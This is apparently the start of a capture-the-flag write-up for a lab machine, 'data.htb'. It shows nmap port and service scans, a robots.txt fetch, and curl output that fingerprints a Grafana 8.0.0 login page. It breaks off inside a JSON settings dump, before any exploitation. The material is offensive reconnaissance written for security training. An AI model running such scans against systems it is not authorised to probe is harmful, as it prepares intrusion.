Target : 10.129.234.47

Date : 21/05/2026

```bash
>  sudo echo "10.129.234.47 data.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.234.47 data.htb  
>  nmap -Pn -sS -sV -sC -O -p- --min-rate=3000 -T4 10.129.234.47  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 09:31 +0200  
Warning: 10.129.234.47 giving up on port because retransmission cap hit (6).  
Nmap scan report for data.htb (10.129.234.47)  
Host is up (0.49s latency).  
Not shown: 64735 closed tcp ports (reset), 798 filtered tcp ports (no-response)  
PORT     STATE SERVICE VERSION  
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)  
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)  
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)  
3000/tcp open  http    Grafana http  
| http-title: Grafana  
|_Requested resource was /login  
| http-robots.txt: 1 disallowed entry    
|_/  
|_http-trane-info: Problem with XML parsing of /evox/about  
Device type: general purpose  
Running: Linux 5.X  
OS CPE: cpe:/o:linux:linux_kernel:5  
OS details: Linux 5.0 - 5.14  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 150.01 seconds
```

I then did a UDP scan, a TCP ACK scan and a TCP SYN scan :

```bash
>  sudo nmap -Pn -PU -p 22,3000 10.129.234.47  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 09:35 +0200  
Nmap scan report for data.htb (10.129.234.47)  
Host is up (0.14s latency).  
  
PORT     STATE SERVICE  
22/tcp   open  ssh  
3000/tcp open  ppp  
  
Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds  
>  sudo nmap -Pn -PA -p 22,3000 10.129.234.47  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 09:35 +0200  
Nmap scan report for data.htb (10.129.234.47)  
Host is up (0.058s latency).  
  
PORT     STATE SERVICE  
22/tcp   open  ssh  
3000/tcp open  ppp  
  
Nmap done: 1 IP address (1 host up) scanned in 0.11 seconds  
>  sudo nmap -Pn -PS -p 22,3000 10.129.234.47  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-21 09:35 +0200  
Nmap scan report for data.htb (10.129.234.47)  
Host is up (0.064s latency).  
  
PORT     STATE SERVICE  
22/tcp   open  ssh  
3000/tcp open  ppp  
  
Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```

We can see that there are only two open ports : 22 and 3000.

```bash
>  curl -s http://data.htb:3000/robots.txt  
  
User-agent: *  
Disallow: /
```

Since the port 3000 (Grafana) didn't give us its version, we'll search for it ourselves :

```bash
>  curl -sL -D- http://data.htb:3000/login -o /tmp/data-grafana-login.html | head -30  
HTTP/1.1 200 OK  
Cache-Control: no-cache  
Content-Type: text/html; charset=UTF-8  
Expires: -1  
Pragma: no-cache  
X-Content-Type-Options: nosniff  
X-Frame-Options: deny  
X-Xss-Protection: 1; mode=block  
Date: Thu, 21 May 2026 07:57:08 GMT  
Transfer-Encoding: chunked  
  
>  grep -iE 'grafana|version' /tmp/data-grafana-login.html | head -20  
  
   <title>Grafana</title>  
   <link rel="mask-icon" href="public/img/grafana_mask_icon.svg" color="#F05A28" />  
   <link rel="stylesheet" href="public/build/grafana.dark.08d1221db5b53eadbfe4.css" />  
 <body class="theme-dark app-grafana">  
       background-image: url("data:image/svg+xml,%3csvg version='1.1' id='Layer_1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px' width='351px' height='365px' vie  
wBox='0 0 351 365' style='enable-background:new 0 0 351 365%3b' xml:space='preserve'%3e %3cstyle type='text/css'%3e .st0%7bfill:url(%23SVGID_1_)%3b%7d %3c/style%3e %3cg id='Layer_1_1_'%3e %3c/g%3e %3clinearGrad  
ient id='SVGID_1_' gradientUnits='userSpaceOnUse' x1='175.5' y1='445.4948' x2='175.5' y2='114.0346'%3e %3cstop offset='0' style='stop-color:%23FFF100'/%3e %3cstop offset='1' style='stop-color:%23F05A28'/%3e %3c  
/linearGradient%3e %3cpath class='st0' d='M342%2c161.2c-0.6-6.1-1.6-13.1-3.6-20.9c-2-7.7-5-16.2-9.4-25c-4.4-8.8-10.1-17.9-17.5-26.8 c-2.9-3.5-6.1-6.9-9.5-10.2c5.1-20.3-6.2-37.9-6.2-37.9c-19.5-1.2-31.9%2c6.1-36.  
5%2c9.4c-0.8-0.3-1.5-0.7-2.3-1 c-3.3-1.3-6.7-2.6-10.3-3.7c-3.5-1.1-7.1-2.1-10.8-3c-3.7-0.9-7.4-1.6-11.2-2.2c-0.7-0.1-1.3-0.2-2-0.3 c-8.5-27.2-32.9-38.6-32.9-38.6c-27.3%2c17.3-32.4%2c41.5-32.4%2c41.5s-0.1%2c0.5-  
0.3%2c1.4c-1.5%2c0.4-3%2c0.9-4.5%2c1.3c-2.1%2c0.6-4.2%2c1.4-6.2%2c2.2 c-2.1%2c0.8-4.1%2c1.6-6.2%2c2.5c-4.1%2c1.8-8.2%2c3.8-12.2%2c6c-3.9%2c2.2-7.7%2c4.6-11.4%2c7.1c-0.5-0.2-1-0.4-1-0.4c-37.8-14.4-71.3%2c2.9-71.  
3%2c2.9 c-3.1%2c40.2%2c15.1%2c65.5%2c18.7%2c70.1c-0.9%2c2.5-1.7%2c5-2.5%2c7.5c-2.8%2c9.1-4.9%2c18.4-6.2%2c28.1c-0.2%2c1.4-0.4%2c2.8-0.5%2c4.2 C18.8%2c192.7%2c8.5%2c228%2c8.5%2c228c29.1%2c33.5%2c63.1%2c35.6%2c63  
.1%2c35.6c0%2c0%2c0.1-0.1%2c0.1-0.1c4.3%2c7.7%2c9.3%2c15%2c14.9%2c21.9c2.4%2c2.9%2c4.8%2c5.6%2c7.4%2c8.3 c-10.6%2c30.4%2c1.5%2c55.6%2c1.5%2c55.6c32.4%2c1.2%2c53.7-14.2%2c58.2-17.7c3.2%2c1.1%2c6.5%2c2.1%2c9.8%2c  
2.9c10%2c2.6%2c20.2%2c4.1%2c30.4%2c4.5 c2.5%2c0.1%2c5.1%2c0.2%2c7.6%2c0.1l1.2%2c0l0.8%2c0l1.6%2c0l1.6-0.1l0%2c0.1c15.3%2c21.8%2c42.1%2c24.9%2c42.1%2c24.9c19.1-20.1%2c20.2-40.1%2c20.2-44.4l0%2c0 c0%2c0%2c0-0.1%2  
c0-0.3c0-0.4%2c0-0.6%2c0-0.6l0%2c0c0-0.3%2c0-0.6%2c0-0.9c4-2.8%2c7.8-5.8%2c11.4-9.1c7.6-6.9%2c14.3-14.8%2c19.9-23.3 c0.5-0.8%2c1-1.6%2c1.5-2.4c21.6%2c1.2%2c36.9-13.4%2c36.9-13.4c-3.6-22.5-16.4-33.5-19.1-35.6l0%  
2c0c0%2c0-0.1-0.1-0.3-0.2 c-0.2-0.1-0.2-0.2-0.2-0.2c0%2c0%2c0%2c0%2c0%2c0c-0.1-0.1-0.3-0.2-0.5-0.3c0.1-1.4%2c0.2-2.7%2c0.3-4.1c0.2-2.4%2c0.2-4.9%2c0.2-7.3l0-1.8l0-0.9 l0-0.5c0-0.6%2c0-0.4%2c0-0.6l-0.1-1.5l-0.1-  
2c0-0.7-0.1-1.3-0.2-1.9c-0.1-0.6-0.1-1.3-0.2-1.9l-0.2-1.9l-0.3-1.9 c-0.4-2.5-0.8-4.9-1.4-7.4c-2.3-9.7-6.1-18.9-11-27.2c-5-8.3-11.2-15.6-18.3-21.8c-7-6.2-14.9-11.2-23.1-14.9 c-8.3-3.7-16.9-6.1-25.5-7.2c-4.3-0.6-  
8.6-0.8-12.9-0.7l-1.6%2c0l-0.4%2c0c-0.1%2c0-0.6%2c0-0.5%2c0l-0.7%2c0l-1.6%2c0.1c-0.6%2c0-1.2%2c0.1-1.7%2c0.1 c-2.2%2c0.2-4.4%2c0.5-6.5%2c0.9c-8.6%2c1.6-16.7%2c4.7-23.8%2c9c-7.1%2c4.3-13.3%2c9.6-18.3%2c15.6c-5%2  
c6-8.9%2c12.7-11.6%2c19.6c-2.7%2c6.9-4.2%2c14.1-4.6%2c21 c-0.1%2c1.7-0.1%2c3.5-0.1%2c5.2c0%2c0.4%2c0%2c0.9%2c0%2c1.3l0.1%2c1.4c0.1%2c0.8%2c0.1%2c1.7%2c0.2%2c2.5c0.3%2c3.5%2c1%2c6.9%2c1.9%2c10.1c1.9%2c6.5%2c4.9%  
2c12.4%2c8.6%2c17.4 c3.7%2c5%2c8.2%2c9.1%2c12.9%2c12.4c4.7%2c3.2%2c9.8%2c5.5%2c14.8%2c7c5%2c1.5%2c10%2c2.1%2c14.7%2c2.1c0.6%2c0%2c1.2%2c0%2c1.7%2c0c0.3%2c0%2c0.6%2c0%2c0.9%2c0c0.3%2c0%2c0.6%2c0%2c0.9-0.1 c0.5%2  
c0%2c1-0.1%2c1.5-0.1c0.1%2c0%2c0.3%2c0%2c0.4-0.1l0.5-0.1c0.3%2c0%2c0.6-0.1%2c0.9-0.1c0.6-0.1%2c1.1-0.2%2c1.7-0.3c0.6-0.1%2c1.1-0.2%2c1.6-0.4 c1.1-0.2%2c2.1-0.6%2c3.1-0.9c2-0.7%2c4-1.5%2c5.7-2.4c1.8-0.9%2c3.4-2%  
2c5-3c0.4-0.3%2c0.9-0.6%2c1.3-1c1.6-1.3%2c1.9-3.7%2c0.6-5.3 c-1.1-1.4-3.1-1.8-4.7-0.9c-0.4%2c0.2-0.8%2c0.4-1.2%2c0.6c-1.4%2c0.7-2.8%2c1.3-4.3%2c1.8c-1.5%2c0.5-3.1%2c0.9-4.7%2c1.2c-0.8%2c0.1-1.6%2c0.2-2.5%2c0.3  
c-0.4%2c0-0.8%2c0.1-1.3%2c0.1c-0.4%2c0-0.9%2c0-1.2%2c0c-0.4%2c0-0.8%2c0-1.2%2c0c-0.5%2c0-1%2c0-1.5-0.1c0%2c0-0.3%2c0-0.1%2c0l-0.2%2c0l-0.3%2c0 c-0.2%2c0-0.5%2c0-0.7-0.1c-0.5-0.1-0.9-0.1-1.4-0.2c-3.7-0.5-7.4-1.6  
-10.9-3.2c-3.6-1.6-7-3.8-10.1-6.6c-3.1-2.8-5.8-6.1-7.9-9.9 c-2.1-3.8-3.6-8-4.3-12.4c-0.3-2.2-0.5-4.5-0.4-6.7c0-0.6%2c0.1-1.2%2c0.1-1.8c0%2c0.2%2c0-0.1%2c0-0.1l0-0.2l0-0.5c0-0.3%2c0.1-0.6%2c0.1-0.9 c0.1-1.2%2c0.  
3-2.4%2c0.5-3.6c1.7-9.6%2c6.5-19%2c13.9-26.1c1.9-1.8%2c3.9-3.4%2c6-4.9c2.1-1.5%2c4.4-2.8%2c6.8-3.9c2.4-1.1%2c4.8-2%2c7.4-2.7 c2.5-0.7%2c5.1-1.1%2c7.8-1.4c1.3-0.1%2c2.6-0.2%2c4-0.2c0.4%2c0%2c0.6%2c0%2c0.9%2c0l1.  
1%2c0l0.7%2c0c0.3%2c0%2c0%2c0%2c0.1%2c0l0.3%2c0l1.1%2c0.1 c2.9%2c0.2%2c5.7%2c0.6%2c8.5%2c1.3c5.6%2c1.2%2c11.1%2c3.3%2c16.2%2c6.1c10.2%2c5.7%2c18.9%2c14.5%2c24.2%2c25.1c2.7%2c5.3%2c4.6%2c11%2c5.5%2c16.9c0.2%2c1.  
5%2c0.4%2c3%2c0.5%2c4.5 l0.1%2c1.1l0.1%2c1.1c0%2c0.4%2c0%2c0.8%2c0%2c1.1c0%2c0.4%2c0%2c0.8%2c0%2c1.1l0%2c1l0%2c1.1c0%2c0.7-0.1%2c1.9-0.1%2c2.6c-0.1%2c1.6-0.3%2c3.3-0.5%2c4.9 c-0.2%2c1.6-0.5%2c3.2-0.8%2c4.8c-0.3  
%2c1.6-0.7%2c3.2-1.1%2c4.7c-0.8%2c3.1-1.8%2c6.2-3%2c9.3c-2.4%2c6-5.6%2c11.8-9.4%2c17.1 c-7.7%2c10.6-18.2%2c19.2-30.2%2c24.7c-6%2c2.7-12.3%2c4.7-18.8%2c5.7c-3.2%2c0.6-6.5%2c0.9-9.8%2c1l-0.6%2c0l-0.5%2c0l-1.1%2c0  
l-1.6%2c0l-0.8%2c0 c0.4%2c0-0.1%2c0-0.1%2c0l-0.3%2c0c-1.8%2c0-3.5-0.1-5.3-0.3c-7-0.5-13.9-1.8-20.7-3.7c-6.7-1.9-13.2-4.6-19.4-7.8 c-12.3-6.6-23.4-15.6-32-26.5c-4.3-5.4-8.1-11.3-11.2-17.4c-3.1-6.1-5.6-12.6-7.4-1  
9.1c-1.8-6.6-2.9-13.3-3.4-20.1l-0.1-1.3l0-0.3 l0-0.3l0-0.6l0-1.1l0-0.3l0-0.4l0-0.8l0-1.6l0-0.3c0%2c0%2c0%2c0.1%2c0-0.1l0-0.6c0-0.8%2c0-1.7%2c0-2.5c0.1-3.3%2c0.4-6.8%2c0.8-10.2 c0.4-3.4%2c1-6.9%2c1.7-10.3c0.7-3.  
4%2c1.5-6.8%2c2.5-10.2c1.9-6.7%2c4.3-13.2%2c7.1-19.3c5.7-12.2%2c13.1-23.1%2c22-31.8c2.2-2.2%2c4.5-4.2%2c6.9-6.2 c2.4-1.9%2c4.9-3.7%2c7.5-5.4c2.5-1.7%2c5.2-3.2%2c7.9-4.6c1.3-0.7%2c2.7-1.4%2c4.1-2c0.7-0.3%2c1.4-0  
.6%2c2.1-0.9c0.7-0.3%2c1.4-0.6%2c2.1-0.9 c2.8-1.2%2c5.7-2.2%2c8.7-3.1c0.7-0.2%2c1.5-0.4%2c2.2-0.7c0.7-0.2%2c1.5-0.4%2c2.2-0.6c1.5-0.4%2c3-0.8%2c4.5-1.1c0.7-0.2%2c1.5-0.3%2c2.3-0.5 c0.8-0.2%2c1.5-0.3%2c2.3-0.5c0  
.8-0.1%2c1.5-0.3%2c2.3-0.4l1.1-0.2l1.2-0.2c0.8-0.1%2c1.5-0.2%2c2.3-0.3c0.9-0.1%2c1.7-0.2%2c2.6-0.3 c0.7-0.1%2c1.9-0.2%2c2.6-0.3c0.5-0.1%2c1.1-0.1%2c1.6-0.2l1.1-0.1l0.5-0.1l0.6%2c0c0.9-0.1%2c1.7-0.1%2c2.6-0.2l1.  
3-0.1c0%2c0%2c0.5%2c0%2c0.1%2c0l0.3%2c0 l0.6%2c0c0.7%2c0%2c1.5-0.1%2c2.2-0.1c2.9-0.1%2c5.9-0.1%2c8.8%2c0c5.8%2c0.2%2c11.5%2c0.9%2c17%2c1.9c11.1%2c2.1%2c21.5%2c5.6%2c31%2c10.3 c9.5%2c4.6%2c17.9%2c10.3%2c25.3%2c1  
6.5c0.5%2c0.4%2c0.9%2c0.8%2c1.4%2c1.2c0.4%2c0.4%2c0.9%2c0.8%2c1.3%2c1.2c0.9%2c0.8%2c1.7%2c1.6%2c2.6%2c2.4c0.9%2c0.8%2c1.7%2c1.6%2c2.5%2c2.4 c0.8%2c0.8%2c1.6%2c1.6%2c2.4%2c2.5c3.1%2c3.3%2c6%2c6.6%2c8.6%2c10c5.2%  
2c6.7%2c9.4%2c13.5%2c12.7%2c19.9c0.2%2c0.4%2c0.4%2c0.8%2c0.6%2c1.2c0.2%2c0.4%2c0.4%2c0.8%2c0.6%2c1.2 c0.4%2c0.8%2c0.8%2c1.6%2c1.1%2c2.4c0.4%2c0.8%2c0.7%2c1.5%2c1.1%2c2.3c0.3%2c0.8%2c0.7%2c1.5%2c1%2c2.3c1.2%2c3%  
2c2.4%2c5.9%2c3.3%2c8.6c1.5%2c4.4%2c2.6%2c8.3%2c3.5%2c11.7 c0.3%2c1.4%2c1.6%2c2.3%2c3%2c2.1c1.5-0.1%2c2.6-1.3%2c2.6-2.8C342.6%2c170.4%2c342.5%2c166.1%2c342%2c161.2z'/%3e %3c/svg%3e");  
     <div class="preloader__text">Loading Grafana</div>  
         <strong>If you're seeing this Grafana has failed to load its application files</strong>  
         2. If you host grafana under subpath make sure your grafana.ini root_url setting includes subpath. If not  
         3. Sometimes restarting grafana-server can help<br />  
         <a href="https://grafana.com/docs/grafana/latest/installation/requirements/#supported-web-browsers">  
         var isEdgeVersion = /Edge\/([0-9.]+)/.exec(navigator.userAgent);  
           ((isEdgeVersion && parseFloat(isEdgeVersion[1]) <= 16) ||  
         alert('Your browser is not fully supported, please try newer version.');  
       window.grafanaBootData = {  
         user: {"isSignedIn":false,"id":0,"login":"","email":"","name":"","lightTheme":false,"orgCount":0,"orgId":0,"orgName":"","orgRole":"","isGrafanaAdmin":false,"gravatarUrl":"","timezone":"browser","local  
e":"en-US","helpFlags1":0,"hasEditPermissionInFolders":false},  
         settings: {"alertingEnabled":true,"alertingErrorOrTimeout":"alerting","alertingMinInterval":1,"alertingNoDataOrNullValues":"no_data","allowOrgCreate":false,"appSubUrl":"","appUrl":"http://localhost:30  
00/","authProxyEnabled":false,"autoAssignOrg":true,"awsAllowedAuthProviders":["default","keys","credentials"],"awsAssumeRoleEnabled":true,"azure":{"cloud":"AzureCloud","managedIdentityEnabled":false},"buildInfo  
":{"buildstamp":1623132323,"commit":"41f0542c1e","edition":"Open Source","env":"production","hasUpdate":false,"hideVersion":false,"isEnterprise":false,"latestVersion":"","version":"8.0.0"},"caching":{"enabled":  
true},"datasources":{"-- Dashboard --":{"meta":{"type":"datasource","name":"-- Dashboard --","id":"dashboard","info":{"author":{"name":"","url":""},"description":"","links":null,"logos":{"small":"public/img/icn  
-datasource.svg","large":"public/img/icn-datasource.svg"},"build":{},"screenshots":null,"version":"","updated":""},"dependencies":{"grafanaVersion":"*","plugins":[]},"includes":null,"module":"app/plugins/dataso  
urce/dashboard/module","baseUrl":"public/app/plugins/datasource/dashboard","category":"","preload":false,"signature":"internal","Root":null,"annotations":false,"metrics":true,"alerting":false,"explore":false,"t  
ables":false,"logs":false,"tracing":false,"builtIn":true,"routes":null,"streaming":false},"name":"-- Dashboard --","type":"datasource"},"-- Grafana --":{"meta":{"type":"datasource","name":"-- Grafana --","id":"  
grafana","info":{"author":{"name":"","url":""},"description":"","links":null,"logos":{"small":"public/img/icn-datasource.svg","large":"public/img/icn-datasource.svg"},"build":{},"screenshots":null,"version":"",  
"updated":""},"dependencies":{"grafanaVersion":"*","plugins":[]},"includes":null,"module":"app/plugins/datasource/grafana/module","baseUrl":"public/app/plugins/datasource/grafana","category":"","preload":false,  
"signature":"internal","Root":null,"annotations":true,"metrics":true,"alerting":false,"explore":false,"tables":false,"logs":false,"tracing":false,"builtIn":true,"routes":null,"streaming":false},"name":"-- Grafa  
na --","type":"datasource"},"-- Mixed --":{"meta":{"type":"datasource","name":"-- Mixed --","id":"mixed","info":{"author":{"name":"","url":""},"description":"","links":null,"logos":{"small":"public/img/icn-data  
source.svg","large":"public/img/icn-datasource.svg"},"build":{},"screenshots":null,"version":"","updated":""},"dependencies":{"grafanaVersion":"*","plugins":[]},"includes":null,"module":"app/plugins/datasource/  
mixed/module","baseUrl":"public/app/plugins/datasource/mixed","category":"","preload":false,"signature":"internal","Root":null,"annotations":false,"metrics":true,"alerting":false,"explore":false,"tables":false,  
"logs":false,"tracing":false,"queryOptions":{"minInterval":true},"builtIn":true,"mixed":true,"routes":null,"streaming":false},"name":"-- Mixed --","type":"datasource"}},"dateFormats":{"fullDate":"YYYY-MM-DD HH:  
mm:ss","useBrowserLocale":false,"interval":{"second":"HH:mm:ss","minute":"HH:mm","hour":"MM/DD HH:mm","day":"MM/DD","month":"YYYY-MM","year":"YYYY"},"defaultTimezone":"browser"},"defaultDatasource":"-- Grafana  
--","disableLoginForm":false,"disableSanitizeHtml":false,"disableUserSignUp":true,"editorsCanAdmin":false,"exploreEnabled":true,"expressionsEnabled":true,"externalUserMngInfo":"","externalUserMngLinkName":"","e  
xternalUserMngLinkUrl":"","featureToggles":{},"googleAnalyticsId":"","http2Enabled":false,"ldapEnabled":false,"licenseInfo":{"edition":"Open Source","expiry":0,"hasLicense":false,"hasValidLicense":false,"licens  
eUrl":"https://grafana.com/products/enterprise/?utm_source=grafana_footer","stateInfo":""},"liveEnabled":true,"loginHint":"email or username","minRefreshInterval":"5s","oauth":{},"panels":{"alertlist":{"baseUrl  
":"public/app/plugins/panel/alertlist","hideFromList":false,"id":"alertlist","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Shows list of alerts and their current status","l  
inks":null,"logos":{"small":"public/app/plugins/panel/alertlist/img/icn-singlestat-panel.svg","large":"public/app/plugins/panel/alertlist/img/icn-singlestat-panel.svg"},"build":{},"screenshots":null,"version":"  
","updated":""},"module":"app/plugins/panel/alertlist/module","name":"Alert list","signature":"internal","skipDataQuery":true,"sort":15,"state":""},"barchart":{"baseUrl":"public/app/plugins/panel/barchart","hid  
eFromList":false,"id":"barchart","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Categorical charts with group support","links":null,"logos":{"small":"public/app/plugins/pane  
l/barchart/img/barchart.svg","large":"public/app/plugins/panel/barchart/img/barchart.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/barchart/module","name":"Bar chart  
","signature":"internal","skipDataQuery":false,"sort":2,"state":"beta"},"bargauge":{"baseUrl":"public/app/plugins/panel/bargauge","hideFromList":false,"id":"bargauge","info":{"author":{"name":"Grafana Labs","ur  
l":"https://grafana.com"},"description":"Horizontal and vertical gauges","links":null,"logos":{"small":"public/app/plugins/panel/bargauge/img/icon_bar_gauge.svg","large":"public/app/plugins/panel/bargauge/img/i  
con_bar_gauge.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/bargauge/module","name":"Bar gauge","signature":"internal","skipDataQuery":false,"sort":5,"state":""},"da  
shlist":{"baseUrl":"public/app/plugins/panel/dashlist","hideFromList":false,"id":"dashlist","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"List of dynamic links to other das  
hboards","links":null,"logos":{"small":"public/app/plugins/panel/dashlist/img/icn-dashlist-panel.svg","large":"public/app/plugins/panel/dashlist/img/icn-dashlist-panel.svg"},"build":{},"screenshots":null,"versi  
on":"","updated":""},"module":"app/plugins/panel/dashlist/module","name":"Dashboard list","signature":"internal","skipDataQuery":true,"sort":16,"state":""},"gauge":{"baseUrl":"public/app/plugins/panel/gauge","h  
ideFromList":false,"id":"gauge","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Standard gauge visualization","links":null,"logos":{"small":"public/app/plugins/panel/gauge/im  
g/icon_gauge.svg","large":"public/app/plugins/panel/gauge/img/icon_gauge.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/gauge/module","name":"Gauge","signature":"inte  
rnal","skipDataQuery":false,"sort":4,"state":""},"gettingstarted":{"baseUrl":"public/app/plugins/panel/gettingstarted","hideFromList":true,"id":"gettingstarted","info":{"author":{"name":"Grafana Labs","url":"ht  
tps://grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/panel/gettingstarted/img/icn-dashlist-panel.svg","large":"public/app/plugins/panel/gettingstarted/img/icn-dashlist-panel.sv  
g"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/gettingstarted/module","name":"Getting Started","signature":"internal","skipDataQuery":true,"sort":100,"state":""},"graph  
":{"baseUrl":"public/app/plugins/panel/graph","hideFromList":false,"id":"graph","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"The old default graph panel","links":null,"log  
os":{"small":"public/app/plugins/panel/graph/img/icn-graph-panel.svg","large":"public/app/plugins/panel/graph/img/icn-graph-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plu  
gins/panel/graph/module","name":"Graph (old)","signature":"internal","skipDataQuery":false,"sort":13,"state":""},"heatmap":{"baseUrl":"public/app/plugins/panel/heatmap","hideFromList":false,"id":"heatmap","info  
":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Like a histogram over time","links":[{"name":"Brendan Gregg - Heatmaps","url":"http://www.brendangregg.com/heatmaps.html"},{"name":  
"Brendan Gregg - Latency Heatmaps","url":" http://www.brendangregg.com/HeatMaps/latency.html"}],"logos":{"small":"public/app/plugins/panel/heatmap/img/icn-heatmap-panel.svg","large":"public/app/plugins/panel/he  
atmap/img/icn-heatmap-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/heatmap/module","name":"Heatmap","signature":"internal","skipDataQuery":false,"sort":10,"st  
ate":""},"histogram":{"baseUrl":"public/app/plugins/panel/histogram","hideFromList":false,"id":"histogram","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"","links":null,"log  
os":{"small":"public/app/plugins/panel/histogram/img/histogram.svg","large":"public/app/plugins/panel/histogram/img/histogram.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins  
/panel/histogram/module","name":"Histogram","signature":"internal","skipDataQuery":false,"sort":12,"state":"beta"},"logs":{"baseUrl":"public/app/plugins/panel/logs","hideFromList":false,"id":"logs","info":{"aut  
hor":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/panel/logs/img/icn-logs-panel.svg","large":"public/app/plugins/panel/logs/img/icn-logs  
-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/logs/module","name":"Logs","signature":"internal","skipDataQuery":false,"sort":100,"state":""},"news":{"baseUrl"  
:"public/app/plugins/panel/news","hideFromList":false,"id":"news","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"RSS feed reader","links":null,"logos":{"small":"public/app/p  
lugins/panel/news/img/news.svg","large":"public/app/plugins/panel/news/img/news.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/news/module","name":"News","signature":  
"internal","skipDataQuery":true,"sort":17,"state":"beta"},"nodeGraph":{"baseUrl":"public/app/plugins/panel/nodeGraph","hideFromList":false,"id":"nodeGraph","info":{"author":{"name":"Grafana Labs","url":"https:/  
/grafana.com"},"description":"","links":null,"logos":{"small":"public/app/plugins/panel/nodeGraph/img/icn-node-graph.svg","large":"public/app/plugins/panel/nodeGraph/img/icn-node-graph.svg"},"build":{},"screens  
hots":null,"version":"","updated":""},"module":"app/plugins/panel/nodeGraph/module","name":"Node Graph","signature":"internal","skipDataQuery":false,"sort":100,"state":"beta"},"piechart":{"baseUrl":"public/app/  
plugins/panel/piechart","hideFromList":false,"id":"piechart","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"The new core pie chart visualization","links":null,"logos":{"smal  
l":"public/app/plugins/panel/piechart/img/icon_piechart.svg","large":"public/app/plugins/panel/piechart/img/icon_piechart.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/pan  
el/piechart/module","name":"Pie chart","signature":"internal","skipDataQuery":false,"sort":8,"state":""},"pluginlist":{"baseUrl":"public/app/plugins/panel/pluginlist","hideFromList":false,"id":"pluginlist","inf  
o":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Plugin List for Grafana","links":null,"logos":{"small":"public/app/plugins/panel/pluginlist/img/icn-dashlist-panel.svg","large":"p  
ublic/app/plugins/panel/pluginlist/img/icn-dashlist-panel.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/pluginlist/module","name":"Plugin list","signature":"internal  
","skipDataQuery":true,"sort":100,"state":""},"stat":{"baseUrl":"public/app/plugins/panel/stat","hideFromList":false,"id":"stat","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description  
":"Big stat values \u0026 sparklines","links":null,"logos":{"small":"public/app/plugins/panel/stat/img/icn-singlestat-panel.svg","large":"public/app/plugins/panel/stat/img/icn-singlestat-panel.svg"},"build":{},  
"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/stat/module","name":"Stat","signature":"internal","skipDataQuery":false,"sort":3,"state":""},"state-timeline":{"baseUrl":"public/app/plu  
gins/panel/state-timeline","hideFromList":false,"id":"state-timeline","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"State changes and durations","links":null,"logos":{"smal  
l":"public/app/plugins/panel/state-timeline/img/timeline.svg","large":"public/app/plugins/panel/state-timeline/img/timeline.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/p  
anel/state-timeline/module","name":"State timeline","signature":"internal","skipDataQuery":false,"sort":9,"state":"beta"},"status-history":{"baseUrl":"public/app/plugins/panel/status-history","hideFromList":fal  
se,"id":"status-history","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Periodic status history","links":null,"logos":{"small":"public/app/plugins/panel/status-history/img/s  
tatus.svg","large":"public/app/plugins/panel/status-history/img/status.svg"},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/status-history/module","name":"Status history","  
signature":"internal","skipDataQuery":false,"sort":11,"state":"beta"},"table":{"baseUrl":"public/app/plugins/panel/table","hideFromList":false,"id":"table","info":{"author":{"name":"Grafana Labs","url":"https:/  
/grafana.com"},"description":"Supports many column styles","links":null,"logos":{"small":"public/app/plugins/panel/table/img/icn-table-panel.svg","large":"public/app/plugins/panel/table/img/icn-table-panel.svg"  
},"build":{},"screenshots":null,"version":"","updated":""},"module":"app/plugins/panel/table/module","name":"Table","signature":"internal","skipDataQuery":false,"sort":6,"state":""},"table-old":{"baseUrl":"publ  
ic/app/plugins/panel/table-old","hideFromList":false,"id":"table-old","info":{"author":{"name":"Grafana Labs","url":"https://grafana.com"},"description":"Table Panel for Grafana","links":null,"logos":{"small":"  
